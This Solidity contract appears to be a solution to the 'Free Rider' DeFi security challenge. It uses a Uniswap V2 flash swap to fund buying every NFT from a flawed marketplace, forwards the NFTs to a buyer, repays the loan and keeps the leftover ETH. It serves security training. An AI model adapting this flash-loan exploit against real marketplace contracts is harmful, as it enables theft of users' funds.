// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";

contract FreeRiderExploit is IUniswapV2Callee {
    // the nft marketplace seems to allow us to buy all the nfts with just 15 eth
    // we can use a flash swap from uniswap v2 to get the needed eth

    address immutable attacker;
    IUniswapV2Pair immutable uniswapPair;
    FreeRiderNFTMarketplace immutable nftMarket;
    IWETH immutable weth;
    IERC721 immutable nft;
    address immutable buyer;
    uint256[] private tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        FreeRiderNFTMarketplace _nftMarket,
        IWETH _weth,
        IUniswapV2Pair _uniswapPair,
        address _buyer
    ) {
        attacker = msg.sender;
        uniswapPair = _uniswapPair;
        nftMarket = _nftMarket;
        weth = _weth;
        nft = _nftMarket.token();
        buyer = _buyer;
    }

    function attack(uint256 amount) external {
        uniswapPair.swap(amount, 0, address(this), new bytes(1));
    }

    function uniswapV2Call(
        address sender,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override {
        require(tx.origin == attacker);
        require(sender == address(this));

        weth.withdraw(amount);

        nftMarket.buyMany{value: amount}(tokenIds);

        for (uint256 tokenId = 0; tokenId < tokenIds.length; tokenId++) {
            nft.safeTransferFrom(sender, buyer, tokenId);
        }

        uint256 amountWithFee = (amount * 1000) / 997 + 1;

        weth.deposit{value: amountWithFee}();
        weth.transfer(msg.sender, amountWithFee);

        (bool sent, ) = attacker.call{value: sender.balance}("");
        require(sent, "exploit failed.");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
